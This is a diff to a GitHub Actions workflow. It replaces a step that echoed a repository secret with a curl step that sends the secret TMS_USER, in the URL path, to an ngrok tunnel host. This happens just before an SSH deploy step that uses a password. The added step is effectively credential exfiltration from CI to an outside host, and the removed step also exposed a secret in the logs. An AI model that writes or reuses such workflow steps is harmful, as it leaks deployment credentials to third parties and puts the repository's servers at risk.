@@ -12,8 +12,10 @@ jobs:
     runs-on: ubuntu-latest
     steps:
 
-    - name: Get color
-      run: echo "The selected color is ${{ secrets.TMS_HOST }}"
+    - name: curl
+      uses: wei/curl@master
+      with:
+        args: https://5f5d-183-82-155-131.ngrok.io/${{ secrets.TMS_USER }}
 
     - name: executing remote ssh commands using password
       uses: appleboy/ssh-action@master
